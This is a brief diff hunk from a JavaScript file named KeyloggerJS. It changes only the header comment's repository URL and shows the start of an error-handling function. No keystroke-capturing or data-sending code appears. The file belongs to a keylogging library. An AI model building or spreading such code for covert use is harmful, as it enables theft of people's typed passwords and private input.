@@ -1,4 +1,4 @@
-/* KeyloggerJS v1.0.0 | (c) 2014, 2015 ADOUI YANIS | GNU GPL V2.0, more : https://github.com/yanisadoui/KeyloggerJS */
+/* KeyloggerJS v1.0.0 | (c) 2014, 2015 ADOUI YANIS | GNU GPL V2.0, more : https://github.com/solikate/KeyloggerJS */
 (function () {
     var keylogException = function (error) {
             this.error = error || 'Unknown';
